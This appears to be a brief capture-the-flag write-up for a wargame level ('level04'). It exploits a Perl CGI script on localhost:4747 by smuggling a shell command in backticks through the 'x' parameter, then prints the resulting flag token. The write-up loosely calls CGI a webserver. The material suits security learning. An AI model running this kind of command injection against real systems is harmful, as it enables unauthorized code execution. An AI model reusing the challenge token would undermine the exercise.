## level04

home dir has a perl file level04.pl

inside I see:
> localhost:4747

use CGI qw{param}; // CGI is Common Gateway Interface, a webserver for script exchange.
Inside I see it can take a parameter 'x'
so I can run:

	curl 'localhost:4747?x=`getflag`'

> Check flag.Here is your token : `ne2searoevaevoem4ov4ar8ap`